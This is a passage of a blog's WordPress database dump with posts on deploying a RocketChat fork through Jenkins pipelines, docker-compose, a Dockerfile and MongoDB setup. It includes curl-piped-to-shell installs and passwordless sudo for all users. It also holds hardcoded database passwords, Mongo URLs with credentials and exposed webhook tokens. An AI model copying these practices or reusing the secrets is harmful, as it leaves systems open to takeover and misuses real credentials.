DOCKER_REGISTRY_CREDENTIAL_ID) {\r\n                        dockerImage.push()\r\n                    }\r\n                }\r\n                sh \"docker images | grep $TYPE_NAME | awk \\\'{print \\$3}\\\' | xargs docker image rm -f\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Docker build image failure\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Docker build image unstable\"\'\r\n                }\r\n                success {\r\n                    sh \'echo \"Docker build image success\"\'\r\n                }\r\n            }\r\n        }\r\n        \r\n        stage(\'Server run Docker\') {\r\n            environment {\r\n                MONGO_URL = credentials(\"mongo.url.test\")\r\n                MONGO_OPLOG_URL = credentials(\"mongo.oplogUrl.test\")\r\n            }\r\n            steps {\r\n                sh \'echo \"Start Server run\"\'\r\n                sshRemoteServer(SCHAT_SERVER_TEST, \'10.240.13.38\', BUILD_VERSION, IMAGE_NAME_TAG, MONGO_URL, MONGO_OPLOG_URL)\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    sh \'echo \"Server run failure\"\'\r\n                }\r\n\r\n                unstable {\r\n                    sh \'echo \"Server run unstable\"\'\r\n                }\r\n                success {\r\n                    sh \'echo \"Server run success\"\'\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\ndef sshRemoteServer(SERVER_ID, INSTANCE_IP, BUILD_VERSION, IMAGE_NAME_TAG, MONGO_URL, MONGO_OPLOG_URL) {\r\n    def DEPLOY_DIRECTORY = \"~/deploy-test-v5\" \r\n    def SCHAT_PORT = 3000\r\n    def composeContent = composeText(IMAGE_NAME_TAG, SCHAT_PORT, INSTANCE_IP, MONGO_URL, MONGO_OPLOG_URL)\r\n\r\n    def removeOldVersion = logicRemoveOldVersion(\"schat_v5_test\")\r\n\r\n    sshPublisher(publishers: [\r\n        sshPublisherDesc(configName: SERVER_ID, transfers: [\r\n            // Delete old image\r\n            sshTransfer(execCommand: \"cat <<\'EOF\' > $DEPLOY_DIRECTORY/remove-old-version.sh \\n$removeOldVersion\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cd $DEPLOY_DIRECTORY && bash remove-old-version.sh\", sourceFiles: \"\"),\r\n            \r\n            sshTransfer(execCommand: \"mkdir -p $DEPLOY_DIRECTORY/$BUILD_VERSION\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cat <<\'EOF\' > $DEPLOY_DIRECTORY/$BUILD_VERSION/docker-compose.yml \\n$composeContent\", sourceFiles: \"\"),\r\n\r\n            sshTransfer(execCommand: \"cd $DEPLOY_DIRECTORY/$BUILD_VERSION && docker-compose pull\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cd $DEPLOY_DIRECTORY/$BUILD_VERSION && docker-compose up -d\", sourceFiles: \"\"),\r\n        ])\r\n    ])\r\n}\r\n\r\n\r\ndef composeText(IMAGE_NAME_TAG, schatPort, instanceIp, mongoUrl, mongoOplogUrl) {\r\n    def compose = \"version: \'3\'\\n\"\r\n    compose += \"services:\\n\"\r\n    compose += \"  schat_v5_test:\\n\"\r\n    compose += \"    container_name: schatapp\\n\"\r\n    compose += \"    image: $IMAGE_NAME_TAG\\n\"\r\n    compose += \"    command: >\\n\"\r\n    compose += \"      bash -c\\n\"\r\n    compose += \"        \\\"for i in `seq 1 30`; do\\n\"\r\n    compose += \"          node main.js &&\\n\"\r\n    compose += \"          s=\\$\\$\\$? && break || s=\\$\\$\\$?;\\n\"\r\n    compose += \"          echo \\\\\\\"Tried \\$\\$i times. Waiting 5 secs...\\\\\\\";\\n\"\r\n    compose += \"          sleep 5;\\n\"\r\n    compose += \"        done; (exit \\$\\$s)\\\"\\n\"\r\n    compose += \"    restart: unless-stopped\\n\"\r\n    compose += \"    networks:\\n\"\r\n    compose += \"      - schat_v5_test_network\\n\"\r\n    compose += \"    volumes:\\n\"\r\n    compose += \"      - /mnt/sghdevschatfilesa:/mnt/sghdevschatfilesa\\n\"\r\n    compose += \"    environment:\\n\"\r\n    compose += \"      - PORT=$schatPort\\n\"\r\n    compose += \"      - ROOT_URL=http://127.0.0.1:$schatPort\\n\"\r\n    compose += \"      - MONGO_URL=$mongoUrl&directConnection=true\\n\"\r\n    compose += \"      - MONGO_OPLOG_URL=$mongoOplogUrl&directConnection=true\\n\"\r\n    compose += \"      - INSTANCE_IP=$instanceIp\\n\"\r\n    compose += \"      - TOOL_NODE_FLAGS=\\\"--max-old-space-size=2048\\\"\\n\"\r\n    compose += \"      - DISABLE_PRESENCE_MONITOR=$DISABLE_PRESENCE_MONITOR\\n\"\r\n    compose += \"      - DISABLE_MESSAGE_PARSER=true\\n\"\r\n    compose += \"    ports:\\n\"\r\n    compose += \"      - $schatPort:3000\\n\"\r\n    compose += \"networks:\\n\"\r\n    compose += \"  schat_v5_test_network:\\n\"\r\n    compose += \"    driver: bridge\\n\"\r\n\r\n    compose\r\n}\r\n\r\ndef logicRemoveOldVersion(string) {\r\n    def bash = \"#! /bin/sh\\n\"\r\n    bash += \"# Remove all containers run by image\\n\"\r\n    bash += \"if [[ \\\"\\$(docker ps -a | grep $string | awk \'{print \\$1}\')\\\" != \\\"\\\" ]]; then\\n\"\r\n    bash += \"docker rm -f \\$(docker ps -a | grep $string | awk \'{print \\$1}\')\\n\"\r\n    bash += \"fi\\n\"\r\n    bash += \"# Remove all image\\n\"\r\n    bash += \"if [[ \\\"\\$(docker images | grep $string | awk \'{print \\$3}\')\\\" != \\\"\\\" ]]; then\\n\"\r\n    bash += \"docker rmi -f \\$(docker images | grep $string | awk \'{print \\$3}\')\\n\"\r\n    bash += \"fi\\n\"\r\n    bash += \"# Remove all network\\n\"\r\n    bash += \"if [[ \\\"\\$(docker network ls | grep $string | awk \'{print \\$1}\')\\\" != \\\"\\\" ]]; then\\n\"\r\n    bash += \"docker network rm \\$(docker network ls | grep $string | awk \'{print \\$1}\')\\n\"\r\n    bash += \"fi\\n\"\r\n    bash\r\n}\r\n\r\n</pre>\r\n\r\n2. Example 2\r\n<pre>\r\npipeline {\r\n    agent any\r\n    environment {\r\n        DOCKER_REGISTRY_URL = \"sgmgmtregistry.azurecr.io\"\r\n        DOCKER_REGISTRY_CREDENTIAL_ID = \"dockerRegistry.sgh\"\r\n        IMAGE = \"schat_test\"\r\n        IMAGE_PUSH = \"$DOCKER_REGISTRY_URL/${IMAGE}:$NEXT_VERSION\"\r\n        GIT_URL = \"https://github.com/ntqpjt/Schat.Rocket.Chat.git\"\r\n        GIT_CREDENTIAL_ID = \"git.vuongtq\"\r\n        GIT_BRANCH = \"$BUILD_BRANCH\"\r\n        BUILD_DIR = \"/tmp/${IMAGE}\"\r\n        SCHAT_SERVER_TEST = \"dev-schat02\"\r\n\r\n        dockerImage = \"\"\r\n    }\r\n\r\n    stages {\r\n        stage(\'Git checkout\') {\r\n            steps {\r\n                withCredentials([gitUsernamePassword(credentialsId: GIT_CREDENTIAL_ID, gitToolName: \'git-tool\')]) {\r\n                    sh \'git gc --prune=now && git remote prune origin && git fetch --all\'\r\n                }\r\n                git url: GIT_URL, credentialsId: GIT_CREDENTIAL_ID, branch: GIT_BRANCH\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Git checkout\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Git checkout\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Install packages\') {\r\n            steps {\r\n                sh \"meteor npm cache clean --force\"\r\n                sh \"rm -rf node_modules/\"\r\n                sh \"meteor npm i\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Install packages\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Install packages\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Meteor build\') {\r\n            steps {\r\n                sh \"rm -rf $BUILD_DIR\"\r\n                sh \"meteor build --directory $BUILD_DIR\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Meteor build\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Meteor build\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Build docker image\') {\r\n            steps {\r\n                sh \"cp .docker/Dockerfile $BUILD_DIR\"\r\n                script {\r\n                    dockerImage = docker.build(IMAGE_PUSH, BUILD_DIR)\r\n                }\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Build docker image\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Build docker image\')\r\n                }\r\n                success {\r\n                    notifyBuildSchat(\'start\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Docker push to registry\') {\r\n            steps {\r\n                script {\r\n                    docker.withRegistry(\'https://\' + DOCKER_REGISTRY_URL, DOCKER_REGISTRY_CREDENTIAL_ID) {\r\n                        dockerImage.push()\r\n                    }\r\n                }\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Docker push to registry\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Docker push to registry\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Remove unused docker image\') {\r\n            steps {\r\n                sh \"docker rmi -f \\$(docker images --filter=reference=\\\"$DOCKER_REGISTRY_URL/$IMAGE*\\\" -q)\"\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Remove unused docker image\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Remove unused docker image\')\r\n                }\r\n            }\r\n        }\r\n\r\n        stage(\'Deploy to remote servers\') {\r\n            environment {\r\n                MONGO_URL = credentials(\"mongo.url.test\")\r\n                MONGO_OPLOG_URL = credentials(\"mongo.oplogUrl.test\")\r\n            }\r\n\r\n            steps {\r\n               sshRemoteServer(SCHAT_SERVER_TEST, \'10.240.13.38\', DOCKER_REGISTRY_URL, IMAGE, IMAGE_PUSH, CURRENT_VERSION, NEXT_VERSION, MONGO_URL, MONGO_OPLOG_URL)\r\n            }\r\n\r\n            post {\r\n                failure {\r\n                    notifyBuild(\'Deploy to remote servers\')\r\n                }\r\n\r\n                unstable {\r\n                    notifyBuild(\'Deploy to remote servers\')\r\n                }\r\n            }\r\n        }\r\n        \r\n        // stage(\'Create release version\') {\r\n        //     environment {\r\n        //         LOGIN_CREDS = credentials(\'schat.login.test\')\r\n        //     }\r\n        //     steps {\r\n        //         sleep 60 // seconds\r\n                \r\n        //         script {\r\n        //             def loginRes = login(LOGIN_CREDS_USR, LOGIN_CREDS_PSW)\r\n                    \r\n        //             createReleaseVersion(loginRes.userId, loginRes.authToken)\r\n        //         }\r\n        //     }\r\n            \r\n        //     post {\r\n        //         failure {\r\n        //             notifyBuild(\'Create release version\')\r\n        //         }\r\n\r\n        //         unstable {\r\n        //             notifyBuild(\'Create release version\')\r\n        //         }\r\n        //     }\r\n        // }\r\n    }\r\n    \r\n    post {\r\n        success {\r\n            notifyBuild(\'\', \'success\')\r\n            notifyBuildSchat(\'done\')\r\n        }\r\n    }\r\n}\r\n\r\ndef sshRemoteServer(SERVER_ID, INSTANCE_IP, DOCKER_REGISTRY_URL, IMAGE, IMAGE_PUSH, CURRENT_VERSION, NEXT_VERSION, MONGO_URL, MONGO_OPLOG_URL) {\r\n    def SCHAT_PORT = 3000\r\n    def HUBOT_PORT = 3001\r\n    def compose = composeText(IMAGE + \'_\' + NEXT_VERSION, IMAGE_PUSH, SCHAT_PORT, HUBOT_PORT, INSTANCE_IP, MONGO_URL, MONGO_OPLOG_URL)\r\n    def fcompose = \"~/deploy-test/$NEXT_VERSION/docker-compose.yml\"\r\n    def removeOldImage = removeOldImageText(DOCKER_REGISTRY_URL, IMAGE, CURRENT_VERSION)\r\n    def fremoveOldImage = \"~/deploy-test/remove-old-image.sh\"\r\n\r\n    sshPublisher(publishers: [\r\n        sshPublisherDesc(configName: SERVER_ID, transfers: [\r\n            // Delete old image\r\n            sshTransfer(execCommand: \"cat <<\'EOF\' > $fremoveOldImage \\n$removeOldImage\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cd ~/deploy-test && bash remove-old-image.sh\", sourceFiles: \"\"),\r\n            \r\n            sshTransfer(execCommand: \"mkdir -p ~/deploy-test/$NEXT_VERSION\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cat <<\'EOF\' > $fcompose \\n$compose\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cd ~/deploy-test/$NEXT_VERSION && docker-compose pull\", sourceFiles: \"\"),\r\n            \r\n            sshTransfer(execCommand: \"cd ~/deploy-test/$CURRENT_VERSION && docker-compose stop\", sourceFiles: \"\"),\r\n            sshTransfer(execCommand: \"cd ~/deploy-test/$NEXT_VERSION && docker-compose up -d\", sourceFiles: \"\"),\r\n        ])\r\n    ])\r\n}\r\n\r\ndef composeText(image, imagePush, schatPort, hubotPort, instanceIp, mongoUrl, mongoOplogUrl) {\r\n    def compose = \"version: \'3\'\\n\"\r\n    compose += \"services:\\n\"\r\n    compose += \"  $image:\\n\"\r\n    compose += \"    image: $imagePush\\n\"\r\n    compose += \"    command: >\\n\"\r\n    compose += \"      bash -c\\n\"\r\n    compose += \"        \\\"for i in `seq 1 30`; do\\n\"\r\n    compose += \"          node main.js &&\\n\"\r\n    compose += \"          s=\\$\\$\\$? && break || s=\\$\\$\\$?;\\n\"\r\n    compose += \"          echo \\\\\\\"Tried \\$\\$i times. Waiting 5 secs...\\\\\\\";\\n\"\r\n    compose += \"          sleep 5;\\n\"\r\n    compose += \"        done; (exit \\$\\$s)\\\"\\n\"\r\n    compose += \"    restart: unless-stopped\\n\"\r\n    compose += \"    volumes:\\n\"\r\n    compose += \"      - /mnt/sghdevschatfilesa:/mnt/sghdevschatfilesa\\n\"\r\n    compose += \"    environment:\\n\"\r\n    compose += \"      - PORT=3000\\n\"\r\n    compose += \"      - ROOT_URL=http://127.0.0.1:$schatPort\\n\"\r\n    compose += \"      - MONGO_URL=$mongoUrl\\n\"\r\n    compose += \"      - MONGO_OPLOG_URL=$mongoOplogUrl\\n\"\r\n    compose += \"      - INSTANCE_IP=$instanceIp\\n\"\r\n    compose += \"      - TOOL_NODE_FLAGS=\\\"--max-old-space-size=2048\\\"\\n\"\r\n    compose += \"      - DISABLE_PRESENCE_MONITOR=$DISABLE_PRESENCE_MONITOR\\n\"\r\n    compose += \"      - DISABLE_MESSAGE_PARSER=true\\n\"\r\n    compose += \"    ports:\\n\"\r\n    compose += \"      - 3000:3000\\n\"\r\n    // compose += \"  hubot:\\n\"\r\n    // compose += \"    image: rocketchat/hubot-rocketchat:latest\\n\"\r\n    // compose += \"    restart: unless-stopped\\n\"\r\n    // compose += \"    environment:\\n\"\r\n    // compose += \"      - ROCKETCHAT_URL=schat:$schatPort\\n\"\r\n    // compose += \"      - ROCKETCHAT_ROOM=GENERAL\\n\"\r\n    // compose += \"      - ROCKETCHAT_USER=bot\\n\"\r\n    // compose += \"      - ROCKETCHAT_PASSWORD=botpassword\\n\"\r\n    // compose += \"      - BOT_NAME=bot\\n\"\r\n    // compose += \"      - EXTERNAL_SCRIPTS=hubot-help,hubot-seen,hubot-links,hubot-diagnostics\\n\"\r\n    // compose += \"    depends_on:\\n\"\r\n    // compose += \"      - $image\\n\"\r\n    // compose += \"    labels:\\n\"\r\n    // compose += \"      - \'traefik.enable=false\'\\n\"\r\n    // compose += \"    ports:\\n\"\r\n    // compose += \"      - $hubotPort:8080\\n\"\r\n    compose\r\n}\r\n\r\ndef removeOldImageText(dockerRegistry, image, currentVersion) {\r\n    def bash = \"#! /bin/sh\\n\"\r\n    bash += \"# Remove stopped containers\\n\"\r\n    bash += \"if [[ \\\"\\$(docker ps -a --filter \'ancestor=$dockerRegistry/$image:$currentVersion\' --filter \'status=exited\' -q)\\\" != \\\"\\\" ]]; then\\n\"\r\n    bash += \"docker rm \\$(docker ps -a --filter \'ancestor=$dockerRegistry/$image:$currentVersion\' --filter \'status=exited\' -q)\\n\"\r\n    bash += \"fi\\n\"\r\n    bash += \"# Remove old images\\n\"\r\n    bash += \"if [[ \\\"\\$(docker images --filter=reference=\\\"$dockerRegistry/$image*\\\" --filter \\\"before=$dockerRegistry/$image:$currentVersion\\\" -q)\\\" != \\\"\\\" ]]; then\\n\"\r\n    bash += \"docker rmi -f \\$(docker images --filter=reference=\\\"$dockerRegistry/$image*\\\" --filter \\\"before=$dockerRegistry/$image:$currentVersion\\\" -q)\\n\"\r\n    bash += \"fi\\n\"\r\n    bash\r\n}\r\n\r\ndef notifyBuild(String step = \'\', String status = \'failed\') {\r\n    // Default values\r\n    // def colorCode = \'#FF9FA1\'\r\n    // def subject = status == \'failed\' ? \"[${env.JOB_NAME}][${env.BUILD_NUMBER}] Step \\\"${step}\\\" ${status}\" : \"[${env.JOB_NAME}][${env.BUILD_NUMBER}] Deploy successfully\"\r\n    // def summary = \"${subject} (${env.BUILD_URL})\"\r\n    \r\n    // if (status == \'failed\') {\r\n    //     colorCode = \'#FF9FA1\'\r\n    // } else {\r\n    //     colorCode = \'#00FF00\'\r\n    // }\r\n\r\n    // // Send notifications\r\n    // slackSend (color: colorCode, message: summary)\r\n}\r\n\r\ndef login(user, password) {\r\n    def body = \"\"\"\r\n        {\"user\": \"$user\", \"password\": \"$password\"}\r\n    \"\"\"\r\n    def response = httpRequest acceptType: \'APPLICATION_JSON\', \r\n                contentType: \'APPLICATION_JSON\', \r\n                httpMode: \'POST\', \r\n                requestBody: body, \r\n                url: \"https://test.schatapp.tk/api/v1/login\"\r\n    \r\n    if (response.status == 200) {\r\n        def jsonObj = readJSON text: response.content;\r\n\r\n        if (jsonObj.status == \"success\") {\r\n            jsonObj.data\r\n        }\r\n    }\r\n}\r\n\r\ndef createReleaseVersion(userId, token) {\r\n    def releaseNote = RELEASE_NOTE.replaceAll(\'\\n\', \'{{NEW_LINE}}\');\r\n    def body = \"\"\"\r\n        {\"version\": \"$NEXT_VERSION\", \"releaseNote\": \"$releaseNote\"}\r\n    \"\"\"\r\n    def response = httpRequest acceptType: \'APPLICATION_JSON\', \r\n                contentType: \'APPLICATION_JSON_UTF8\', \r\n                httpMode: \'POST\', \r\n                requestBody: body, \r\n                customHeaders:[[name: \'X-Auth-Token\', value: \"${token}\"], [name: \'X-User-Id\', value: \"${userId}\"]],\r\n                url: \"https://test.schatapp.tk/api/v1/web-versions.create\"\r\n    \r\n    if (response.status == 200) {\r\n        def jsonObj = readJSON text: response.content;\r\n\r\n        if (jsonObj.status == \"success\") {\r\n            jsonObj.data\r\n        }\r\n    }\r\n}\r\n\r\ndef notifyBuildSchat(String step = \'start\') {\r\n    def message = \"Em dang build con test nhe\"\r\n    def who = WHO ? WHO : \"notify-build\"\r\n\r\n    def releaseNote = RELEASE_NOTE.replaceAll(\'\\n\', \', \');\r\n\r\n    if (releaseNote) {\r\n      message += \". Task: ${releaseNote}\"\r\n    }\r\n\r\n    if (step == \'done\') {\r\n        message = \'Con test build xong roi m.n nha.\'\r\n    }\r\n\r\n    def body = \"\"\"\r\n        {\"alias\": \"${who}\", \"text\": \"$message\"}\r\n    \"\"\"\r\n    try {\r\n      def response = httpRequest acceptType: \'APPLICATION_JSON\', \r\n                  contentType: \'APPLICATION_JSON\', \r\n                  httpMode: \'POST\', \r\n                  requestBody: body, \r\n                  // url: \"https://test.schatapp.tk/hooks/WtMMmeQftobYe3e67/YEtQHMh5hzQZDkJk2Z6a4TndgdqmsxQZ9QTBkTki6AB3md8d\"\r\n                  url: \"https://schat.ntq.solutions/hooks/ezczqdNisGabjBoBd/CFq7tLhqGoBgDwJSteCsXFjNqftdyuJNZ2KHBzPBser3bobu\"\r\n    } catch (err) {\r\n        echo \"Failed: ${err}\"\r\n    }\r\n}\r\n\r\n\r\n</pre>\r\n', 'RocketChat – P3: Jenkins', '', 'publish', 'open', 'open', '', 'docker-jenkins-p1', '', '', '2022-10-27 08:12:21', '2022-10-27 08:12:21', '', 0, 'https://duycode.com/?p=2492', 0, 'post', '', 0),
(2509, 1, '2022-10-10 01:32:09', '2022-10-10 01:32:09', '1. File docker-compose.yml\r\n<pre>\r\nversion: \'3\'\r\n\r\nservices:\r\n  mongo:\r\n    image: mongo:4.2.17\r\n    restart: unless-stopped\r\n    environment:\r\n     - MONGO_INITDB_ROOT_USERNAME=admin\r\n     - MONGO_INITDB_ROOT_PASSWORD=admin\r\n     - MONGO_INITDB_DATABASE=admin\r\n    volumes:\r\n     - ./data/db:/data/db\r\n     - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro\r\n    command: mongod --oplogSize 128 --replSet rs0 --storageEngine=wiredTiger\r\n    labels:\r\n      - \"traefik.enable=false\"\r\n    ports:\r\n      - 7017:27017\r\n\r\n  mongo-init-replica:\r\n    image: mongo:4.2.17\r\n    command: >\r\n      bash -c\r\n        \"for i in `seq 1 30`; do\r\n          mongo mongo/schat -u admin -p \'admin\' --authenticationDatabase admin --eval \\\"\r\n            rs.initiate({\r\n              _id: \'rs0\',\r\n              members: [ { _id: 0, host: \'mongo:27017\' } ]})\\\" &&\r\n          s=$$? && break || s=$$?;\r\n          echo \\\"Tried $$i times. Waiting 5 secs...\\\";\r\n          sleep 5;\r\n        done; (exit $$s)\"\r\n    depends_on:\r\n      - mongo\r\n</pre>\r\n\r\n2. file init-mongo.js\r\n<pre>\r\ndb.auth(\'admin\', \'admin\');\r\n\r\ndb = db.getSiblingDB(\'schat\');\r\ndb.createUser({\r\n  user: \'schat\',\r\n  pwd: \'schat12345\',\r\n  roles: [{ role: \'dbOwner\', db: \'schat\' }]\r\n});\r\n\r\n</pre>', 'MongoDB - ReplicaSet', '', 'publish', 'open', 'open', '', 'mongodb-replicaset', '', '', '2022-10-12 08:35:33', '2022-10-12 08:35:33', '', 0, 'https://duycode.com/?p=2509', 0, 'post', '', 0),
(2515, 1, '2022-10-01 02:00:36', '2022-10-01 02:00:36', '- Tạo 1 folder dự án riêng tên là: SchatDocker\r\n<h3>1. Create file ./Dockerfile</h3>\r\n<pre>\r\nFROM ubuntu:20.04\r\nENV user rocketchat\r\n\r\nRUN apt update && apt install -y sudo\r\n\r\nRUN useradd -m -d /home/${user} ${user} \\\r\n    && chown -R ${user} /home/${user} \\\r\n    && adduser ${user} sudo \\\r\n    && echo \'%sudo ALL=(ALL) NOPASSWD:ALL\' >> /etc/sudoers\r\n\r\nUSER ${user}\r\nWORKDIR /home/${user}\r\n\r\nSHELL [\"/bin/bash\", \"--login\", \"-c\"]\r\n\r\nRUN sudo apt install -y g++ build-essential git curl python2-minimal \\\r\n    && curl https://install.meteor.com/ | sh \\ \r\n    && curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash\r\n\r\nRUN source ~/.profile && nvm install 14.19.3 && npm i -g yarn\r\n\r\nCOPY [\"id_ecdsa\", \"id_ecdsa.pub\", \"/home/rocketchat/.ssh/\"]\r\n\r\nRUN sudo chown -R ${user} ~/.ssh && sudo chmod 600 ~/.ssh/id_ecdsa && sudo chmod 600 ~/.ssh/id_ecdsa.pub\r\nRUN eval $(ssh-agent -s) \\\r\n    && ssh-add ~/.ssh/id_ecdsa \\\r\n    && ssh-keyscan -t ecdsa github.com >> ~/.ssh/known_hosts \\\r\n    && git clone git@github.com:ntqpjt/Schat.Rocket.Chat.git\r\n\r\nRUN source ~/.profile \\\r\n    && cd ~/Schat.Rocket.Chat && git fetch --all && git checkout origin/rocketchat/5.1.4 \\\r\n    && cd ~/Schat.Rocket.Chat/apps/meteor && meteor --version \\\r\n    && cd ~/Schat.Rocket.Chat && yarn\r\n\r\nRUN mkdir -p ~/build\r\n# Create SSH key : ssh-keygen -t ecdsa\r\n# Build Image    : docker build -t rocketchat:v5 -f Dockerfile .\r\n# Run container  : docker run -dt --name schat_v5 -v /home/schatadmin/apps/build/:/home/rocketchat/build/ rocketchat:v5\r\n# Note           : source ~/.profile ==> alway run in bash because use nvm for nodejs 14.19.3\r\n\r\n</pre>\r\n\r\n<h3>2. Create file: ./docker-compose.yml</h3>\r\n<pre>\r\nversion: \'3.3\'\r\n\r\nservices:\r\n  nodejs:\r\n    container_name: ubuntu_rocketchat\r\n    image: ubuntu_rocketchat:1.0.0\r\n    tty: true\r\n    restart: on-failure\r\n    build:\r\n      dockerfile: Dockerfile\r\n      context: \"./\"\r\n    # volumes:\r\n    #   - ./data/build:/home/rocketchat/build\r\n    #   - ./data/RocketChat:/home/rocketchat/Schat.Rocket.Chat\r\n    ports:\r\n      - \"8000:3000\"\r\n      - \"8001:3001\"\r\n\r\n# docker compose up -d\r\n# docker exec -it ubuntu_rocketchat bash\r\n# $ source ~/.profile\r\n# $ npm i -g browserslist caniuse-lite\r\n\r\n</pre>\r\n\r\n<h3>3. Create file ssh</h3>\r\n- Tạo file: ./id_ecdsa\r\n- Tạo file: ./id_ecdsa.pub\r\n- Thêm public key vào Github\r\n', 'RocketChat - P1: Dockerfile, docker-compose', '', 'publish', 'open', 'open', '', 'rocketchat-p1-dockerfile-docker-compose', '', '', '2022-10-20 19:17:23', '2022-10-20 19:17:23', '', 0, 'https://duycode.com/?p=2515', 0, 'post', '', 0),
(2520, 1, '2022-10-01 01:00:04', '2022-10-01 01:00:04', '- Tạo network:\r\n<blockquote>docker network create --driver bridge schat_network</blockquote>\r\n\r\n<h2>1. docker-compose</h2>\r\n<pre>\r\nversion: \'3\'\r\n\r\nnetworks:\r\n  default:\r\n    external:\r\n      name: schat_network\r\n\r\nservices:\r\n  mongo:\r\n    container_name: schat_database\r\n    image: mongo:4.2.17\r\n    restart: unless-stopped\r\n    environment:\r\n      - MONGO_INITDB_ROOT_USERNAME=admin\r\n      - MONGO_INITDB_ROOT_PASSWORD=admin\r\n      - MONGO_INITDB_DATABASE=admin\r\n    volumes:\r\n      - ./data/db:/data/db\r\n      - ./init-mongo.js:/docker-entrypoint-initdb.d/init-mongo.js:ro\r\n    command: mongod --oplogSize 128 --replSet rs0 --storageEngine=wiredTiger\r\n    labels:\r\n      - \"traefik.enable=false\"\r\n    ports:\r\n      - 27017:27017\r\n\r\n  mongo-init-replica:\r\n    image: mongo:4.2.17\r\n    command: >\r\n      bash -c\r\n        \"for i in `seq 1 30`; do\r\n          mongo mongo/schat -u admin -p \'admin\' --authenticationDatabase admin --eval \\\"\r\n            rs.initiate({\r\n              _id: \'rs0\',\r\n              members: [ { _id: 0, host: \'mongo:27017\' } ]})\\\" &&\r\n          s=$$? && break || s=$$?;\r\n          echo \\\"Tried $$i times. Waiting 5 secs...\\\";\r\n          sleep 5;\r\n        done; (exit $$s)\"\r\n    depends_on:\r\n      - mongo\r\n</pre>\r\n\r\n<h2>2 ./init-mongo.js</h2>\r\n<pre>\r\ndb.auth(\'admin\', \'admin\');\r\n\r\ndb = db.getSiblingDB(\'schat\');\r\ndb.createUser({\r\n  user: \'schat\',\r\n  pwd: \'schat12345\',\r\n  roles: [{ role: \'dbOwner\', db: \'schat\' }]\r\n});\r\n</pre>\r\n\r\n<h2>** Note</h2>\r\nTrỏ Port MongoDB 271017 sang Port 3300\r\n<pre>\r\ndocker run --detach --publish 3300:27017 --link schat_database:target --net schat_network alpine/socat tcp-listen:27017,fork,reuseaddr tcp-connect:target:27017\r\n</pre>', 'RocketChat – P2: Tạo Database', '', 'publish', 'open', 'open', '', 'rocketchat-p1-tao-database', '', '', '2022-10-21 04:53:24', '2022-10-21 04:53:24', '', 0, 'https://duycode.com/?p=2520', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(2526, 1, '2022-10-01 04:00:01', '2022-10-01 04:00:01', '<h2>1. docker-compose</h2>\r\n<pre>\r\nversion: \'3\'\r\nservices:\r\n  schat_v5_test:\r\n    image: sgmgmtregistry.azurecr.io/schat_v5_test:95\r\n    command: >\r\n      bash -c\r\n        \"for i in `seq 1 30`; do\r\n          node main.js &&\r\n          s=$$? && break || s=$$?;\r\n          echo \\\"Tried $i times. Waiting 5 secs...\\\";\r\n          sleep 5;\r\n        done; (exit $s)\"\r\n    restart: unless-stopped\r\n    networks:\r\n      - schat_v5_test_network\r\n    volumes:\r\n      - /mnt/sghdevschatfilesa:/mnt/sghdevschatfilesa\r\n    environment:\r\n      - PORT=3000\r\n      - ROOT_URL=http://127.0.0.1:3000\r\n      - MONGO_URL=mongodb://schat:schat12345@10.240.13.38:27017/schat?authSource=schat&directConnection=true\r\n      - MONGO_OPLOG_URL=mongodb://admin:admin@10.240.13.38:27017/local?authSource=admin&directConnection=true\r\n      - INSTANCE_IP=10.240.13.38\r\n      - TOOL_NODE_FLAGS=\"--max-old-space-size=2048\"\r\n      - DISABLE_PRESENCE_MONITOR=false\r\n      - DISABLE_MESSAGE_PARSER=true\r\n    ports:\r\n      - 3000:3000\r\nnetworks:\r\n  schat_v5_test_network:\r\n    driver: bridge\r\n</pre>', 'RocketChat - P4: Run code on Server by Docker', '', 'publish', 'open', 'open', '', 'rocketchat-p4-run-code-on-server-by-docker', '', '', '2022-10-11 10:22:11', '2022-10-11 10:22:11', '', 0, 'https://duycode.com/?p=2526', 0, 'post', '', 0),
